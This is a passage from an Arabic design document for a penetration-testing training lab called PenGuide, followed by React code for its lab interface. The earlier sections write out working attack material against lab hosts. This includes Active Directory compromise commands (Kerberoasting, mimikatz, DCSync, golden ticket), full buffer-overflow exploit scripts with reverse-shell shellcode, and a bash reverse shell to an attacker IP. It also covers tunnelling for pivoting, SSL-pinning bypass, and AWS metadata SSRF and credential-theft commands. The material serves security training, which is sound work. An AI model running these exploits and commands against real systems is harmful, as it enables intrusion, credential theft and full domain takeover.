PrintSpoofer.exe -i -c cmd
```

**Flag pool:** 5 flags لكل ثغرة محلية.

---

### 🏢 فئة Active Directory (3 أجهزة كاملة — شبكة واحدة)

#### الشبكة AD-LAB-1: مختبر Active Directory الكامل
```yaml
Network ID:    ad-lab-1
Domain:        corp.lab.local
Forest:        lab.local
Difficulty:    متقدم ⭐⭐⭐⭐
Total Points:  600 (200 لكل جهاز)
الفئة:         ad
```

**الأجهزة:**

| ID | IP | Hostname | Role | OS |
|----|-----|----------|------|-----|
| ad_dc01 | 10.10.20.10 | DC01 | Primary DC | Windows Server 2019 |
| ad_ws01 | 10.10.20.20 | WS01 | Workstation | Windows 10 21H2 |
| ad_ws02 | 10.10.20.21 | WS02 | Workstation + SQL | Windows 10 21H2 |

**المستخدمون (مع المسارات):**
```
Domain Users:
─────────────
john.doe        : Summer2024!         — regular user (entry point)
jane.smith      : Winter2023!         — local admin on WS02
bob.wilson      : Password1!          — regular user
alice.king      : ChangeMe123!        — regular user

Service Accounts:
─────────────────
svc_sql         : Sql$ervice2024      — SPN exists ✅ Kerberoastable
svc_backup      : Backup4U!           — DCSync rights ⚠️
svc_web         : Web@dminPass        — SPN exists ✅ Kerberoastable

Privileged:
───────────
Administrator   : P@ssw0rd123!        — Domain Admin
helpdesk_admin  : Help!Pass2024       — Account Operator
da_jenkins      : Jenkins#Pass        — DA — مخفي في GPP
```

**سيناريو الهجوم الكامل (Attack Path):**

```
Phase 1: Initial Access
═══════════════════════
START → Phishing payload on john.doe → low-priv shell on WS01

Phase 2: Local Recon
════════════════════
whoami /all
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

Phase 3: Domain Enumeration
═══════════════════════════
.\PowerView.ps1
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
Get-DomainComputer
Get-DomainGroup -Name "Domain Admins" | Get-DomainGroupMember

# BloodHound
SharpHound.exe -c All
# → svc_sql is Kerberoastable

Phase 4: Kerberoasting
══════════════════════
GetUserSPNs.py -dc-ip 10.10.20.10 corp.lab.local/john.doe:Summer2024! -request
# Hash for svc_sql
hashcat -m 13100 svc_sql_hash.txt /usr/share/wordlists/rockyou.txt
# Cracked: Sql$ervice2024

Phase 5: Lateral Movement
═════════════════════════
# Login to WS02 as svc_sql (it's local admin there)
psexec.py corp.lab.local/svc_sql:'Sql$ervice2024'@10.10.20.21
# SYSTEM on WS02

Phase 6: Credential Harvesting
═══════════════════════════════
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
# → Found jane.smith hash

# OR via secretsdump locally
secretsdump.py -sam SAM -system SYSTEM LOCAL

Phase 7: Domain Admin Path
═══════════════════════════
# jane.smith is in Account Operators
# Account Operators can modify non-privileged users
# Find user with DCSync rights → svc_backup
Add-DomainObjectAcl -TargetIdentity svc_backup -Rights DCSync ...

# OR find GPP password (cPassword) on SYSVOL
findstr /S /I cpassword \\corp.lab.local\sysvol\corp.lab.local\policies\*.xml
# Decrypt with gpp-decrypt → da_jenkins password

Phase 8: DCSync — Full Domain Compromise
═════════════════════════════════════════
secretsdump.py -just-dc corp.lab.local/da_jenkins:Jenkins#Pass@10.10.20.10
# → All hashes including krbtgt!

Phase 9: Persistence — Golden Ticket
═════════════════════════════════════
# Use krbtgt hash to forge tickets
ticketer.py -nthash <krbtgt_NT_hash> -domain-sid <SID> \
  -domain corp.lab.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.lab.local/Administrator@dc01.corp.lab.local
```

**Flags:**
```
FLAG{AD_KERBEROAST_SVC_SQL}            (200 pts)
FLAG{AD_LATERAL_TO_WS02}               (200 pts)
FLAG{AD_GPP_CPASSWORD_FOUND}           (200 pts)
FLAG{AD_DCSYNC_KRBTGT}                 (300 pts)
FLAG{AD_GOLDEN_TICKET_DOMAIN_OWNED}    (500 pts) — final
```

**هذه الأجهزة الـ 3 (DC, WS01, WS02) تعمل كشبكة واحدة — يجب اختراق الجميع للحصول على Domain Admin.**

---

### 🔴 فئة Buffer Overflow (2 جهاز)

#### الجهاز 23 — Brainpan (Linux/Wine BOF)
```yaml
ID:           brainpan
IP:           10.10.10.60
OS:           Wine + Linux
صعوبة:        متقدم ⭐⭐⭐
النقاط:       400
الفئة:        bof
```

**البورتات:**
```
9999/brainpan      ← Stack BOF (no ASLR/DEP) ✅
10000/http         ← Web panel
```

**Exploit Development الكامل:**

```python
#!/usr/bin/env python3
# brainpan_exploit.py — Step by step

import socket, sys, time

target = "10.10.10.60"
port = 9999

# ═══ Step 1: Verify connection ═══
def test_connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    banner = s.recv(1024)
    print(f"[+] Banner: {banner}")
    s.close()

# ═══ Step 2: Fuzzing ═══
def fuzz():
    buffer = b"A" * 100
    while len(buffer) < 4000:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.recv(1024)
            print(f"[*] Sending {len(buffer)} bytes")
            s.send(b"OVERFLOW1 " + buffer + b"\r\n")
            s.close()
            buffer += b"A" * 100
            time.sleep(1)
        except Exception as e:
            print(f"[+] Crashed at: {len(buffer)} bytes")
            sys.exit()

# ═══ Step 3: Find EIP offset ═══
# msf-pattern_create -l 700
pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0..." # truncated
# After crash, EIP = 35724134
# msf-pattern_offset -q 35724134 → Exact offset: 524

OFFSET = 524

# ═══ Step 4: Find bad characters ═══
badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
    b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    # ... 0x01-0xff
)
# Found bad chars: \x00 only

# ═══ Step 5: Find JMP ESP ═══
# In Immunity Debugger:
# !mona modules
# !mona find -s "\xff\xe4" -m brainpan.exe
JMP_ESP = b"\xf3\x12\x17\x31"   # 0x311712f3 (little-endian)

# ═══ Step 6: Generate shellcode ═══
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.100 \
#   LPORT=4444 -b "\x00" -f python -v shellcode
shellcode = (
    b"\xbb\x6e\xce\xc8\xb5\xda\xd9\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x12"
    b"\x31\x5b\x12\x03\x5b\x12\x83\xc3\x04\xe2\xff\x52\x4d\x3f\x80\x10"
    b"..."
)

# ═══ Step 7: Build final payload ═══
padding = b"A" * OFFSET           # 524 A's
nop_sled = b"\x90" * 16           # NOP slide

payload = padding + JMP_ESP + nop_sled + shellcode
# Total: 524 + 4 + 16 + len(shellcode)

# ═══ Step 8: Fire! ═══
def exploit():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.recv(1024)
    print(f"[+] Sending {len(payload)} byte payload")
    s.send(b"OVERFLOW1 " + payload + b"\r\n")
    print("[+] Check your listener!")

if __name__ == "__main__":
    # nc -lvnp 4444 first!
    exploit()
```

**Flags:**
```
FLAG{BRAINPAN_OFFSET_FOUND_524}          (50 pts)
FLAG{BRAINPAN_JMPESP_GADGET}             (100 pts)
FLAG{BRAINPAN_USER_PUCK}                 (100 pts)
FLAG{BRAINPAN_ROOT_VIA_ANANSI}           (150 pts)
```

---

#### الجهاز 24 — VulnServer (Windows BOF Master)
```yaml
ID:           vulnserver
IP:           10.10.10.61
OS:           Windows 7 SP1 x86
صعوبة:        خبير ⭐⭐⭐⭐
النقاط:       500 (100 لكل أمر)
الفئة:        bof
```

**6 أوامر ضعيفة (كل واحد له flag منفصل):**

| الأمر | نوع الثغرة | الصعوبة |
|-------|-----------|---------|
| TRUN | Stack BOF (سهل) | ⭐⭐⭐ |
| GMON | SEH Overflow | ⭐⭐⭐⭐ |
| GTER | BOF + Bad Chars | ⭐⭐⭐⭐ |
| KSTET | Egg Hunter | ⭐⭐⭐⭐⭐ |
| LTER | BOF + Many Bad Chars | ⭐⭐⭐⭐ |
| HTER | Hex String BOF | ⭐⭐⭐⭐⭐ |

**TRUN exploit:**
```python
import socket
ip = "10.10.10.61"
port = 9999

offset = 2003
overflow = b"A" * offset
retn = b"\xaf\x11\x50\x62"   # JMP ESP from essfunc.dll
padding = b"\x90" * 16
shellcode = b"..."   # msfvenom -p windows/shell_reverse_tcp ...

payload = overflow + retn + padding + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.recv(1024)
s.send(b"TRUN /.:/ " + payload + b"\r\n")
```

**Flags (6):**
```
FLAG{VULNSERVER_TRUN_PWNED}
FLAG{VULNSERVER_GMON_SEH}
FLAG{VULNSERVER_GTER_BAD_CHARS}
FLAG{VULNSERVER_KSTET_EGGHUNTER}
FLAG{VULNSERVER_LTER_RESTRICTED}
FLAG{VULNSERVER_HTER_HEX_DECODE}
FLAG{VULNSERVER_FULL_MASTERY}    (bonus +200 if all 6)
```

---

### 🌐 فئة Pivoting & Network (2 شبكة معقدة)

#### الشبكة 25 — Pivoting Lab (3 شبكات متداخلة)
```yaml
Network ID:     pivot-lab-1
Difficulty:     متقدم جداً ⭐⭐⭐⭐
Total Points:   800
الفئة:          pivot
```

**Topology:**
```
                          ┌─────────────────┐
[ATTACKER]  10.10.10.100  │   PenGuide      │
   │                       │   Attacker      │
   │                       └─────────────────┘
   │
   ├── 10.10.10.0/24 (External Network)
   │       │
   │       └─→ PIVOT-WEB (10.10.10.70)  ← Entry point (web RCE)
   │             │  + 2 NICs
   │             │  + tunnel target
   │             ▼
   ├── 10.10.30.0/24 (DMZ — internal)
   │       │
   │       ├─→ FILE-SRV (10.10.30.10)   ← SMB old, EternalBlue
   │       └─→ APP-SRV  (10.10.30.20)   ← Tomcat manager weak
   │             │  + 2 NICs
   │             ▼
   └── 10.10.40.0/24 (Restricted — DC subnet)
           │
           ├─→ DC-INNER (10.10.40.10)   ← AD DC — Kerberoast
           └─→ DB-INNER (10.10.40.20)   ← MSSQL — xp_cmdshell
```

**Phase 1: External → DMZ via Pivot**
```bash
# 1. Web RCE on PIVOT-WEB
sqlmap -u "http://10.10.10.70/search?q=" --os-shell

# 2. Reverse shell
echo "bash -i >& /dev/tcp/10.10.10.100/4444 0>&1" | bash

# 3. Setup Ligolo-ng tunnel
# Attacker:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Victim (uploaded):
./agent -connect 10.10.10.100:11601 -ignore-cert

# In ligolo session:
session
[Select agent]
start
ip route add 10.10.30.0/24 dev ligolo
```

**Phase 2: DMZ → Restricted via Double Pivot**
```bash
# After APP-SRV compromise (Tomcat):
# Upload second ligolo agent
./agent2 -connect 10.10.10.100:11602

# Add new route
ip route add 10.10.40.0/24 dev ligolo2

# Now reach DC-INNER and DB-INNER
nmap -p 88,389,445 10.10.40.10
```

**Flags (8):**
```
FLAG{PIVOT_WEB_RCE_INITIAL}              (100)
FLAG{PIVOT_TUNNEL_ESTABLISHED}           (100)
FLAG{PIVOT_FILE_SRV_ETERNALBLUE}         (100)
FLAG{PIVOT_APP_TOMCAT_DEPLOY}            (100)
FLAG{PIVOT_DOUBLE_TUNNEL_DEEP}           (100)
FLAG{PIVOT_DC_KERBEROAST}                (150)
FLAG{PIVOT_DB_XP_CMDSHELL}               (100)
FLAG{PIVOT_DOMAIN_ADMIN_DEEP_NETWORK}    (250) — final
```

---

#### الشبكة 26 — Red Team Engagement
```yaml
Network ID:     redteam-1
Difficulty:     خبير ⭐⭐⭐⭐⭐
Total Points:   1000
الفئة:          pivot
```

**سيناريو واقعي:** اختراق شركة "TechCorp" — phishing → workstation → AD → exfiltration → persistence + cleanup. 5 شبكات، 12 جهاز.

---

### 📱 فئة Mobile Android (2 جهاز)

#### الجهاز 27 — Android Insecure App
```yaml
ID:           android_app1
IP:           10.10.10.80 (ADB exposed)
صعوبة:        متوسط ⭐⭐
النقاط:       300
الفئة:        mobile
```

**Tools:** apktool, jadx, frida, objection.

**Exploits:**
```bash
# Decompile
apktool d insecure-app.apk -o app/

# View Java
jadx-gui insecure-app.apk

# Find hardcoded secrets
grep -r "API_KEY\|password\|secret" app/

# SSL Pinning Bypass
frida -U -l ssl-bypass.js -f com.insecure.app

# Root detection bypass
objection -g com.insecure.app explore
android root disable

# WebView XSS
adb shell am start -n com.app/.MainActivity \
  -e url 'javascript:alert(document.cookie)'
```

**Flags (4):**
```
FLAG{ANDROID_HARDCODED_API_KEY}
FLAG{ANDROID_SSL_PINNING_BYPASSED}
FLAG{ANDROID_INSECURE_STORAGE}
FLAG{ANDROID_WEBVIEW_XSS}
```

---

#### الجهاز 28 — Mobile API Backend
```yaml
ID:           mobile_api
IP:           10.10.10.81
صعوبة:        متوسط ⭐⭐⭐
النقاط:       300
الفئة:        mobile
```

**Vulns:** API key in app → backend access → IDOR → mass assignment → JWT manipulation.

---

### ☁️ فئة Cloud (2 لاب AWS/Azure محاكاة)

#### الجهاز 29 — AWS Misconfig Lab
```yaml
ID:           aws_lab
Endpoint:     simulated-aws.lab.local
صعوبة:        متقدم ⭐⭐⭐
النقاط:       400
الفئة:        cloud
```

**Vulns:**
- Public S3 bucket with secrets
- IAM over-privileged role
- EC2 instance metadata (IMDSv1 SSRF)
- Lambda env vars leak
- CloudTrail not enabled

```bash
# Find public S3 bucket
aws s3 ls s3://techcorp-backups --no-sign-request
aws s3 cp s3://techcorp-backups/.env .

# Use leaked AWS keys
aws configure
aws sts get-caller-identity

# Enumerate IAM
aws iam list-users
aws iam list-attached-user-policies --user-name dev_intern

# Privilege escalation via iam:PassRole
aws iam pass-role --role-name AdminRole

# IMDSv1 SSRF (target EC2)
curl http://10.10.10.90/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Flags (5):**
```
FLAG{AWS_PUBLIC_S3_LEAK}
FLAG{AWS_LEAKED_KEYS_USED}
FLAG{AWS_IAM_PRIV_ESCALATION}
FLAG{AWS_IMDSV1_SSRF}
FLAG{AWS_FULL_ACCOUNT_TAKEOVER}
```

---

#### الجهاز 30 — Kubernetes Cluster Lab
```yaml
ID:           k8s_lab
صعوبة:        متقدم ⭐⭐⭐⭐
النقاط:       400
الفئة:        cloud
```

**Vulns:** exposed kubelet, RBAC misconfig, secret in env, container escape.

**Flag:** `FLAG{K8S_CLUSTER_ADMIN_TAKEOVER}`

---

### 🔬 فئة Reverse Engineering (1 جهاز)

#### الجهاز 31 — Reversing Challenges
```yaml
ID:           re_lab
صعوبة:        متقدم ⭐⭐⭐
النقاط:       350 (50 لكل crackme)
الفئة:        revrse
```

**7 crackmes:**
1. **Easy String Comparison** — strings command
2. **XOR Encryption** — Ghidra/IDA
3. **Anti-debug Bypass** — patch instructions
4. **Custom Algorithm** — reverse logic
5. **Packed Binary** — UPX unpack
6. **Cryptographic Check** — find key
7. **Final Boss** — combined

**Tools:** Ghidra (linked tutorial), radare2, x64dbg, IDA Free.

---

### 🔍 فئة Forensics & Crypto (1 جهاز)

#### الجهاز 32 — Forensics Investigation
```yaml
ID:           forensics_case1
صعوبة:        متوسط ⭐⭐⭐
النقاط:       300
الفئة:        forensics
```

**Challenges:**
- PCAP analysis (Wireshark)
- Memory dump (Volatility)
- Steganography (steghide, zsteg)
- File carving (foremost, binwalk)
- Hash cracking (hashcat custom rules)
- Timeline reconstruction (plaso)

**Flag pool:** 6 flags، 50 نقطة لكل واحد.


---

## 4. الشبكات والسيناريوهات المتقدمة

### 🌐 الشبكات الأربع المعقدة

#### Network 1: AD Lab (corp.lab.local) — مشروح أعلاه ✅
#### Network 2: Pivoting Lab (3 subnets) — مشروح أعلاه ✅

#### Network 3: Cloud Hybrid Network
```
On-Premise:                    Cloud:
─────────                      ──────
DC01      (10.10.50.10)        ←→  AWS VPC
WS-CORP   (10.10.50.20)             ├── EC2 (web)
FILE-SRV  (10.10.50.30)             ├── S3 (backups)
                                    ├── RDS (db)
                                    └── Lambda (api)

Connection: VPN tunnel 10.10.50.0/24 ↔ 172.31.0.0/16
```

**Attack scenarios:**
- On-prem AD compromise → cloud federated identity
- Cloud SSRF → on-prem network access
- Hybrid privilege escalation paths

---

#### Network 4: IoT + OT Network
```
SCADA-PLC  (192.168.100.10)   — Modbus
HMI        (192.168.100.20)   — Web interface
SENSOR-1   (192.168.100.30)   — MQTT
ROUTER-IoT (192.168.100.1)    — Default creds
```

**Attack:** Modbus enumeration → MQTT injection → PLC takeover.

---

### 🎯 سيناريوهات الهجوم الـ 8 (Attack Chains)

كل سيناريو = سلسلة من الأجهزة بترتيب معين، مع شرح متكامل:

| # | السيناريو | الأجهزة | المدة | النقاط |
|---|-----------|---------|--------|--------|
| 1 | "Hello World" Pentest | Metasploitable → DVWA | 2 ساعات | 250 |
| 2 | Web App Penetration | DVWA → Mr.Robot → Juice Shop | 6 ساعات | 700 |
| 3 | Linux PrivEsc Mastery | Vulnix → Stapler → SickOS | 5 ساعات | 800 |
| 4 | Windows Workstation | Win7 → Win10 → Win2008 | 4 ساعات | 800 |
| 5 | Active Directory Full Chain | AD-LAB-1 (3 machines) | 8 ساعات | 1500 |
| 6 | Pivoting & Multi-Network | Pivot Lab (5 machines) | 10 ساعات | 1800 |
| 7 | Buffer Overflow Mastery | Brainpan → VulnServer | 8 ساعات | 900 |
| 8 | Red Team Engagement | Full Red Team scenario | 15 ساعة | 3000 |

كل سيناريو يحتوي:
- 📜 Story / Background (سياق الهجوم)
- 🎯 Objectives (أهداف محددة)
- 🗺️ Attack tree diagram
- 📝 Pre-engagement checklist
- 🔧 Required tools
- 📊 Final report template
- 🏆 Bonus challenges

---

## 5. نظام التحديات والـ CTF الأسبوعي

### 🎮 التحدي اليومي (Daily Challenge)

كل يوم 24 ساعة:
- جهاز عشوائي يُختار من المختبر
- مكافأة x2 للنقاط
- Badge خاص لإكمال 7 أيام متتالية ("Streak Master")
- Countdown timer

```typescript
// Daily Challenge Logic
const todayChallenge = {
  date: new Date().toISOString().split('T')[0],
  machineId: pickByDate(MACHINES),
  multiplier: 2.0,
  bonusPoints: 25,
  expiresAt: nextMidnight(),
};
```

### 🏆 CTF الأسبوعي (كل أحد)

تحدي جديد كل أسبوع، يبدأ يوم الأحد:
- 5 أعلام: Easy → Medium → Hard → Insane → Final
- مدة: 7 أيام
- نقاط: 500-2000
- Leaderboard خاص أسبوعي
- جوائز: Badges حصرية + إعلان الفائز في صفحة Hall of Fame

**أنواع تحديات CTF:**
```
Week 1:   Web Challenge        (SQL injection chain)
Week 2:   Linux PrivEsc        (kernel exploit)
Week 3:   AD Challenge         (Kerberoasting + DCSync)
Week 4:   Crypto Puzzle        (RSA + AES)
Week 5:   Reverse Engineering  (custom binary)
Week 6:   Forensics Case       (incident response)
Week 7:   Buffer Overflow      (ASLR/DEP bypass)
Week 8:   Mixed / Final Boss   (multi-stage)
```

### 💎 التحديات الخاصة (Special Events)

```
Ramadan Challenge       — تحدي رمضاني خاص (15 يوم)
Saudi National Day      — تحدي اليوم الوطني السعودي
PenGuide Anniversary    — احتفال سنوي
24-Hour Marathon        — تحدي ماراثون 24 ساعة
Team Challenge          — تحدي فرق (فريقان يتنافسان)
```

---

## 6. الكود الكامل — VirtualLab.tsx

```tsx
// /src/components/lab/VirtualLab.tsx
import { useState, useRef, useEffect, useCallback, useMemo } from "react";
import { useNavigate } from "@tanstack/react-router";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/hooks/useAuth";
import { useLabPermissions } from "@/hooks/useLabPermissions";
import { Terminal as TerminalIcon, Lock, CheckCircle2, Star, 
         Trophy, Zap, BookOpen, Network, Shield, Crown,
         Search, Filter, Play, RotateCcw, Award, Clock } from "lucide-react";
import { MACHINES } from "@/data/machines";
import { NETWORKS } from "@/data/networks";
import { ATTACK_CHAINS } from "@/data/attackChains";
import { Terminal } from "./Terminal";
import { MachineCard } from "./MachineCard";
import { NetworkMap } from "./NetworkMap";
import { DailyChallenge } from "./DailyChallenge";
import { ProgressTracker } from "./ProgressTracker";
import { AIHelperButton } from "./AIHelperButton";
import { ReportGenerator } from "./ReportGenerator";
import { ScoreBoard } from "./ScoreBoard";
import { BadgeShowcase } from "./BadgeShowcase";
import type { Machine, Network as NetworkType, Progress } from "@/types/lab";

// ═══════════════════════════════════════════════════════════
// MAIN VIRTUAL LAB COMPONENT
// ═══════════════════════════════════════════════════════════

export default function VirtualLab() {
  const { user, profile } = useAuth();
  const { 
    canAccessMachine, 
    canDownload, 
    isGuest, 
    isTrial, 
    isSubscribed,
    isAdmin,
    remainingAttempts 
  } = useLabPermissions();
  
  const navigate = useNavigate();

  // ═══ State ═══════════════════════════════════════════════
  const [activeMachine, setActiveMachine] = useState<Machine | null>(null);
  const [activeNetwork, setActiveNetwork] = useState<NetworkType | null>(null);
  const [completedIds, setCompletedIds] = useState<Set<string>>(new Set());
  const [machineProgress, setMachineProgress] = useState<Record<string, Progress>>({});
  const [userPoints, setUserPoints] = useState(0);
  const [userBadges, setUserBadges] = useState<string[]>([]);
  
  // ═══ Filters ═════════════════════════════════════════════
  const [searchQuery, setSearchQuery] = useState("");
  const [filterCategory, setFilterCategory] = useState<string>("all");
  const [filterDifficulty, setFilterDifficulty] = useState<string>("all");
  const [viewMode, setViewMode] = useState<"machines"|"networks"|"chains"|"ctf">("machines");

  // ═══ Load user progress ══════════════════════════════════
  useEffect(() => {
    if (!user) return;
    loadUserProgress();
  }, [user]);

  async function loadUserProgress() {
    const { data: completions } = await supabase
      .from("lab_completions")
      .select("machine_id, completed_at, points_earned, progress_state")
      .eq("user_id", user!.id);

    if (completions) {
      const ids = new Set(completions.map(c => c.machine_id));
      setCompletedIds(ids);
      
      const progressMap: Record<string, Progress> = {};
      completions.forEach(c => {
        if (c.progress_state) progressMap[c.machine_id] = c.progress_state;
      });
      setMachineProgress(progressMap);
    }

    const { data: badges } = await supabase
      .from("user_badges")
      .select("badge_id")
      .eq("user_id", user!.id);
    
    if (badges) setUserBadges(badges.map(b => b.badge_id));

    const { data: profile } = await supabase
      .from("profiles")
      .select("total_points")
      .eq("id", user!.id)
      .single();
    
    if (profile) setUserPoints(profile.total_points || 0);
  }

  // ═══ Filtered machines ═══════════════════════════════════
  const filteredMachines = useMemo(() => {
    return MACHINES.filter(m => {
      const matchesSearch = !searchQuery || 
        m.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
        m.ip.includes(searchQuery) ||
        m.os.toLowerCase().includes(searchQuery.toLowerCase());
      const matchesCat = filterCategory === "all" || m.category === filterCategory;
      const matchesDiff = filterDifficulty === "all" || m.difficulty === filterDifficulty;
      return matchesSearch && matchesCat && matchesDiff;
    });
  }, [searchQuery, filterCategory, filterDifficulty]);

  // ═══ Stats ═══════════════════════════════════════════════
  const totalPoints = MACHINES.reduce((sum, m) => sum + m.points, 0);
  const completionPct = (completedIds.size / MACHINES.length) * 100;

  // ═══ Launch machine — with permission check ══════════════
  const handleLaunch = useCallback((machine: Machine) => {
    if (!canAccessMachine(machine, completedIds)) {
      // Show subscription prompt
      navigate({ to: "/pricing", search: { reason: "lab_locked" } });
      return;
    }
    setActiveMachine(machine);
  }, [canAccessMachine, completedIds, navigate]);

  // ═══ Handle flag captured ════════════════════════════════
  const handleFlagCaptured = useCallback(async (machineId: string, points: number, flagId: string) => {
    if (completedIds.has(machineId)) return; // Already completed
    
    setCompletedIds(prev => new Set([...prev, machineId]));
    setUserPoints(prev => prev + points);
    
    // Save to database
    if (user) {
      await supabase.from("lab_completions").insert({
        user_id: user.id,
        machine_id: machineId,
        flag_id: flagId,
        points_earned: points,
        completed_at: new Date().toISOString(),
        progress_state: machineProgress[machineId],
      });

      // Update profile total points
      await supabase.rpc("increment_user_points", {
        user_id: user.id,
        delta: points,
      });

      // Check for new badges
      await checkAndAwardBadges(machineId, completedIds.size + 1);
    }

    // Show celebration
    triggerConfetti();
    showToast(`🚩 Flag captured! +${points} نقاط`, "success");
  }, [user, completedIds, machineProgress]);

  async function checkAndAwardBadges(machineId: string, totalCompleted: number) {
    // Logic: check if user qualifies for new badges
    const newBadges: string[] = [];
    
    if (totalCompleted === 1 && !userBadges.includes("first_blood")) {
      newBadges.push("first_blood");
    }
    if (totalCompleted >= 5 && !userBadges.includes("scriptkiddie")) {
      newBadges.push("scriptkiddie");
    }
    if (totalCompleted >= 10 && !userBadges.includes("junior_pentester")) {
      newBadges.push("junior_pentester");
    }
    // ... more badge logic
    
    for (const badgeId of newBadges) {
      await supabase.from("user_badges").insert({
        user_id: user!.id,
        badge_id: badgeId,
        earned_at: new Date().toISOString(),
      });
      showToast(`🏆 شارة جديدة: ${badgeId}`, "success");
    }
    setUserBadges(prev => [...prev, ...newBadges]);
  }

  // ═══ Render — Active Terminal ════════════════════════════
  if (activeMachine) {
    return (
      <Terminal
        machine={activeMachine}
        currentProgress={machineProgress[activeMachine.id] || initProgress()}
        onProgressUpdate={(p) => setMachineProgress(prev => ({ ...prev, [activeMachine.id]: p }))}
        onFlagCapture={(pts, flagId) => handleFlagCaptured(activeMachine.id, pts, flagId)}
        onClose={() => setActiveMachine(null)}
        userCanDownload={canDownload}
        isGuest={isGuest}
        remainingAttempts={remainingAttempts}
      />
    );
  }

  // ═══ Render — Network View ═══════════════════════════════
  if (activeNetwork) {
    return (
      <NetworkMap
        network={activeNetwork}
        completedMachines={completedIds}
        onMachineClick={handleLaunch}
        onClose={() => setActiveNetwork(null)}
      />
    );
  }

  // ═══ Main Lab Page ═══════════════════════════════════════
  return (
    <div className="min-h-screen bg-[var(--bg-primary)] text-[var(--text-primary)]">
      <Watermark text={`${profile?.email || "guest"} · PenGuide`} />
      
      {/* ═══ Header ═══════════════════════════════════════ */}
      <div className="border-b border-[var(--border-color)] bg-gradient-to-r from-yellow-500/10 to-transparent px-6 py-6">
        <div className="max-w-7xl mx-auto">
          <div className="flex items-start justify-between flex-wrap gap-4">
            <div>
              <div className="flex items-center gap-3 mb-2">
                <TerminalIcon className="w-8 h-8 text-yellow-500" />
                <h1 className="text-3xl font-bold">المختبر الافتراضي</h1>
                <span className="px-2 py-0.5 bg-yellow-500 text-black text-xs rounded-full font-semibold">
                  v4.0
                </span>
              </div>
              <p className="text-sm opacity-70">
                {isGuest && "تجربة مجانية — أجهزة محدودة"}
                {isTrial && `تجربة 7 أيام — ${remainingAttempts} محاولة متبقية اليوم`}
                {isSubscribed && "اشتراك فعّال — وصول كامل لـ 32 جهاز"}
                {isAdmin && "👑 صلاحيات أدمن — وصول كامل بدون قيود"}
              </p>
            </div>

            {/* Stats Cards */}
            <div className="flex gap-3 flex-wrap">
              <StatCard icon={Trophy} label="نقاطك" value={userPoints} max={totalPoints} color="yellow" />
              <StatCard icon={CheckCircle2} label="أجهزة مكتملة" value={completedIds.size} max={MACHINES.length} color="green" />
              <StatCard icon={Award} label="شارات" value={userBadges.length} max={24} color="purple" />
              <StatCard icon={Zap} label="المستوى" value={calcLevel(userPoints)} color="blue" />
            </div>
          </div>

          {/* Progress Bar */}
          <div className="mt-6">
            <div className="flex justify-between text-xs mb-1.5 opacity-70">
              <span>التقدم الإجمالي</span>
              <span>{completionPct.toFixed(1)}%</span>
            </div>
            <div className="h-2 bg-gray-800 rounded-full overflow-hidden">
              <div
                className="h-full bg-gradient-to-r from-yellow-600 to-yellow-400 transition-all duration-700"
                style={{ width: `${completionPct}%` }}
              />
            </div>
          </div>
        </div>
      </div>

      {/* ═══ Daily Challenge Card ════════════════════════ */}
      <div className="max-w-7xl mx-auto px-6 mt-6">
        <DailyChallenge onAccept={handleLaunch} />
      </div>

      {/* ═══ View Mode Tabs ═══════════════════════════════ */}
      <div className="max-w-7xl mx-auto px-6 mt-6">
        <div className="flex gap-2 border-b border-[var(--border-color)]">
          {[
            { key: "machines", label: "الأجهزة", icon: Shield, count: MACHINES.length },
            { key: "networks", label: "الشبكات", icon: Network, count: NETWORKS.length },
            { key: "chains", label: "سيناريوهات", icon: Crown, count: ATTACK_CHAINS.length },
            { key: "ctf", label: "تحديات CTF", icon: Trophy, count: 0 },
          ].map(tab => (
            <button
              key={tab.key}
              onClick={() => setViewMode(tab.key as any)}
              className={`flex items-center gap-2 px-4 py-2.5 text-sm transition-colors border-b-2 ${
                viewMode === tab.key
                  ? "border-yellow-500 text-yellow-500"
                  : "border-transparent opacity-60 hover:opacity-100"
              }`}
            >
              <tab.icon className="w-4 h-4" />
              {tab.label}
              {tab.count > 0 && <span className="text-xs opacity-50">({tab.count})</span>}
            </button>
          ))}
        </div>
      </div>

      {/* ═══ Filters (only for machines view) ═══════════════ */}
      {viewMode === "machines" && (
        <div className="max-w-7xl mx-auto px-6 py-4">
          <div className="flex flex-wrap gap-3 items-center">
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 opacity-50" />
              <input
                type="text"
                placeholder="بحث: اسم، IP، أو OS..."
                value={searchQuery}
                onChange={e => setSearchQuery(e.target.value)}
                className="bg-[var(--bg-card)] border border-[var(--border-color)] rounded-lg pl-9 pr-3 py-2 text-sm outline-none w-56"
              />
            </div>

            <select
              value={filterCategory}
              onChange={e => setFilterCategory(e.target.value)}
              className="bg-[var(--bg-card)] border border-[var(--border-color)] rounded-lg px-3 py-2 text-sm"
            >
              <option value="all">كل الفئات</option>
              <option value="linux-easy">Linux مبتدئ</option>
              <option value="web-easy">ويب مبتدئ</option>
              <option value="linux-med">Linux متوسط</option>
              <option value="web-med">ويب متوسط</option>
              <option value="windows">Windows</option>
              <option value="ad">Active Directory</option>
              <option value="bof">Buffer Overflow</option>
              <option value="pivot">Pivoting</option>
              <option value="mobile">Mobile</option>
              <option value="cloud">Cloud</option>
              <option value="revrse">Reverse Engineering</option>
              <option value="forensics">Forensics</option>
            </select>

            <select
